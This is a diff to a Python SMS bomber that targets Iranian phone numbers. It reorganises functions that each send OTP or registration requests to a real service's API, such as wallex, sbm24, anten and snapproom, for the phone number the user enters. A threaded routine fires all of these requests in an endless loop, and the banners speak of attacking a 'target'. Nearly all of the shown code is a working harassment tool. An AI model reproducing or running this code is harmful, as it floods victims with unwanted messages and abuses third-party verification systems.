@@ -4,7 +4,7 @@ from re import match, sub
 from threading import Thread, active_count
 import urllib3; urllib3.disable_warnings()
 from time import sleep
-from user_agent import generate_user_agent
+from user_agent import generate_user_agent  
 try:
     from requests import get, post
 except ImportError:
@@ -1134,19 +1134,9 @@ def offch(phone):
             post(url="https://api.offch.com/auth/otp",json=n4, headers=rhead)
             return True
         except:
-            pass
-
-def wallex(phone):
-        n4 = {"username":"0"+phone.split('+98')[1]}
-        rhead = {'user-agent': generate_user_agent()}
-        try:
-            post(url="https://api.wallex.ir/v2/auth/register",json=n4,headers=rhead)
-            return True
-        except:
-             pass
-
+            pass        
 def sibbazar(phone):
-        liJ = {"username": "0"+ phone.split('+98')[1]}
+        liJ = {"username": "0"+phone.split('+98')[1]}
         liU = "https://sandbox.sibbazar.com/api/v1/user/invite"
         liH = {'accept': 'application/json','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-type': 'application/json','content-length': ',26','origin': 'https://developer.sibbazar.com','referer': 'https://developer.sibbazar.com/','sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36'}
         try:
@@ -1154,8 +1144,6 @@ def sibbazar(phone):
             return True    
         except:
             pass
-
-
 
             
 def raminashop(phone):
@@ -1197,9 +1185,6 @@ def zivanpet(phone):
             return True
         except:
             pass
-
-
-
 
 def emtiaz(phone):
     #emtiaz api
@@ -1281,54 +1266,6 @@ def dadhesab(phone):
         except:
             pass
 
-
-
-def sbm24(phone):
-        n4 = {"username":"0"+phone.split('+98')[1]}
-        rhead = {"user-agent": generate_user_agent()}
-        try:
-             post(url="https://sandbox.sbm24.net/api/v2/authenticate/send-confirmation-code?mobile=0{}",json=n4,headers=rhead)
-             return True
-        except:
-             pass
-
-def anten(phone):
-        n4 = {"username":"0"+phone.split('+98')[1]}
-        rhead = {"user-agent": generate_user_agent()}
-        try:
-            post(url="https://api2.anten.ir/users/",json=n4,headers=rhead)
-            return True
-        except:
-             pass
-        
-def togmond(phone):
-        n4 = {"username":"0"+phone.split('+98')[1]}
-        rhead = {"user-agent": generate_user_agent()}
-        try:
-            post(url="https://tagmond.com/phone_number",json=n4,headers=rhead)
-            return True
-        except:
-             pass
-
-
-def tebinja(phone):
-        n4 = {"username":"0"+phone.split('+98')[1]}
-        rhead = {"user-agent": generate_user_agent()}
-        try:
-            post(url="https://www.tebinja.com/api/v1/users")
-            return True
-        except:
-             pass
-        
-def snapproom(phone):
-        n4 = {"username":"0"+phone.split('+98')[1]}
-        rhead = {"user-agent": generate_user_agent()}
-        try:
-            post(url="https://napi.snapproom.com/users/self/verification-flow",json=n4,headers=rhead)
-            return True
-        except:
-             pass
-        
 
 def dosma(phone):
         n4 = {"username":"0"+phone.split('+98')[1]}
@@ -1506,6 +1443,53 @@ def uphone(phone):
             return True
         except:
             pass
+
+
+def sbm24(phone):
+        n4 = {"username":"0"+phone.split('+98')[1]}
+        rhead = {"user-agent": generate_user_agent()}
+        try:
+             post(url="https://sandbox.sbm24.net/api/v2/authenticate/send-confirmation-code?mobile=0{}",json=n4,headers=rhead)
+             return True
+        except:
+             pass
+
+def anten(phone):
+        n4 = {"username":"0"+phone.split('+98')[1]}
+        rhead = {"user-agent": generate_user_agent()}
+        try:
+            post(url="https://api2.anten.ir/users/",json=n4,headers=rhead)
+            return True
+        except:
+             pass
+        
+def togmond(phone):
+        n4 = {"username":"0"+phone.split('+98')[1]}
+        rhead = {"user-agent": generate_user_agent()}
+        try:
+            post(url="https://tagmond.com/phone_number",json=n4,headers=rhead)
+            return True
+        except:
+             pass
+
+
+def tebinja(phone):
+        n4 = {"username":"0"+phone.split('+98')[1]}
+        rhead = {"user-agent": generate_user_agent()}
+        try:
+            post(url="https://www.tebinja.com/api/v1/users")
+            return True
+        except:
+             pass
+        
+def snapproom(phone):
+        n4 = {"username":"0"+phone.split('+98')[1]}
+        rhead = {"user-agent": generate_user_agent()}
+        try:
+            post(url="https://napi.snapproom.com/users/self/verification-flow",json=n4,headers=rhead)
+            return True
+        except:
+             pass
 
 
 def amoomilad(phone):
@@ -2440,7 +2424,7 @@ def ragham_call(phone):
 
 
 
-# ================================[SEND SMS FUNC]================================
+#API SMS
 def is_phone(phone: str):
     if match(r"(\+989|^989|09|9)[0-9]{9}", phone):
         return sub(r"(\+989|^989|09)", "+989", phone)
@@ -2644,13 +2628,12 @@ def Vip(phone, Time):
     Thread(target=deniizshop, args=[phone]).start(), sleep(Time) # 195
     Thread(target=shad, args=[phone]).start(), sleep(Time) #196
     Thread(target=emtiaz, args=[phone]).start(), sleep(Time) #197
-    Thread(target=wallex, args=[phone]).start(), sleep(Time)#198
     Thread(target=sbm24, args=[phone]).start(), sleep(Time)#198
     Thread(target=anten, args=[phone]).start(), sleep(Time)#198
     Thread(target=togmond, args=[phone]).start(), sleep(Time)#199
     Thread(target=tebinja, args=[phone]).start(), sleep(Time)#201
     Thread(target=snapproom, args=[phone]).start(), sleep(Time)#202
-
+  
 
 
 r='\033[1;31m'
@@ -2662,33 +2645,35 @@ if __name__ == '__main__':
         for char in Str:
             print(char, end='', flush=True)
             sleep(.01)
-    printLow(f'''{r}++++++++++++++++++++++++++++
-{w} HEY BRO WASSAP? LEZ FUCK YOUR TARGET
-{g} HAHAHAHAHA
-{g} +++++++++++++++++++++++++
+    print('''
 
-{y}Welcome TO OUR FUCKING SMS BOMBER:
-    {g}[+] {y}DEVELOPER: ☯⥼Laster𝓓м#5796
-    {g}[+] {y} SmS BoMbEr
-    {g}[+] {y} WE LOVE YOU SUPPORT US BY FUCKING YOUR TARGETS! 
-    {g}[+] {y} THIS SOURCE CODE IS PRIVATE DONT PUBLISH IT!
-    
-{y}system:
-    {g}[+] {y}Platform: {w}{System}
-    {g}[+] {y}Node: {w}{Node}
-    {g}[+] {y}Release: {w}{Release}
-    
+▒▒▒▒▒▒▒▒▒▒▒▄▄▄▄░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+▒▒▒▒▒▒▒▒▒▄██████▒▒▒▒▒▄▄▄█▄▒▒▒▒▒▒▒▒▒▒                                                            
+▒▒▒▒▒▒▒▄██▀░░▀██▄▒▒▒▒████████▄▒▒▒▒▒▒                    Developer : Lasterfor3ver 
+▒▒▒▒▒▒███░░░░░░██▒▒▒▒▒▒█▀▀▀▀▀██▄▄▒▒                              
+▒▒▒▒▒▄██▌░░░░░░░██▒▒▒▒▐▌▒▒▒▒▒▒▒▒▀█▄▒                    SmS BoMbEr
+▒▒▒▒▒███░░▐█░█▌░██▒▒▒▒█▌▒▒▒▒▒▒▒▒▒▒▀▌                    Used Api: 210
+▒▒▒▒████░▐█▌░▐█▌██▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒            
+▒▒▒▐████░▐░░░░░▌██▒▒▒█▌▒▒▒▒▒▒▒▒▒▒▒▒▒                    
+▒▒▒▒████░░░▄█░░░██▒▒▐█▒▒▒▒▒▒▒▒▒▒▒▒▒▒              
+▒▒▒▒████░░░██░░██▌▒▒█▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+▒▒▒▒████▌░▐█░░███▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+▒▒▒▒▐████░░▌░███▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+▒▒▒▒▒████░░░███▒▒▒▒█▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+▒▒▒██████▌░████▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+▒▐████████████▒▒███▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+▒█████████████▄████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 ''')
     while True:
-        phone = is_phone(input(f'{g}[?] {y}Enter Phone Number {g}(+98) {r}- {w}'))
+        phone = is_phone(input(f'{g}[+] SHOMARE TARGET RA VARED KONID(AVAL SHOMARE 0 BASHE +98 RO HAZF KONID) {r}- {w}'))
         if phone:
             break
     try:
-        Time = float(input(f'{g}[?] {y}Enter Sleep Time Between Requests {g}[Defult=0.1] {r}- {w}'))
+        Time = float(input(f'{g}[+] MEQDAR ERSAL PAYAM BAR SANIE {g}[PISHFARZ=0.1 , 0 ENTEKHAB NAKONID] {r}- {w}'))
     except ValueError:
         Time = 0.1
-        print(f"{g}[0.1] {w}Used")
+        print(f"{g}[0.1] {w}ENTEKHAB SHOD")
     while True:
         try: Vip(phone, Time)
-        except KeyboardInterrupt: exit(f'{r}[-] User Exited')
-        except: print(f'{r}[-] Error TimeOut')
+        except KeyboardInterrupt: exit(f'{r}[-] KHAREG SHODID!')
+        except: print(f'{r}[-] BE MOSHKEL KHORDID')
